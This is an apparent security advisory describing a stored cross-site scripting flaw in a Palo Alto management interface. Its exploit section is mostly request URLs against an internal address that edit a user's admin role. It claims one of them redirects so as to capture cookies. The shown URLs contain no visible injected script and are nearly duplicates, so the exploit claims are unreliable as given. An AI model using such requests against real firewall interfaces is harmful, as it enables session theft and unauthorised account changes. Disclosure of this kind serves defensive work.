Discussion:

A Stored Cross-Site Scripting (XSS) vulnerability was found within the Palo
Alto interface. By crafting a URL that includes XSS code it is possible to
inject malicious data, redirect the user to a bogus replica of the real
website, or other nefarious activity.

Exploit:
Single Line working-
https://10.32.5.223:443/esp/editUser.esp?mode=edit&origusername=test&deviceC=localhost.localdomain&vsysC=localhost.localdomain%2Fvsys1&vsys=&profile=&cfgchange=&opasswd=&tpasswd=********&cpasswd=********&role=vsysadmin


&admin-role=%5Bobject+Object%5D&bSubmit=O

WORKING FOR REDIRECT TO LOAD cookies into URL.

https://10.32.5.223:443/esp/editUser.esp?mode=edit&origusername=test&deviceC=localhost.localdomain&vsysC=localhost.localdomain%2Fvsys1&vsys=&profile=&cfgchange=&opasswd=&tpasswd=********&cpasswd=********&role=vsysadmin&admin-role=%5Bobject+Object%5D&bSubmit=O

Solution:
A patch will be required from the vendor. It is recommended a routine to
sanitize user input be consistently implemented throughout the application
to mitigate other such occurrences within the application.
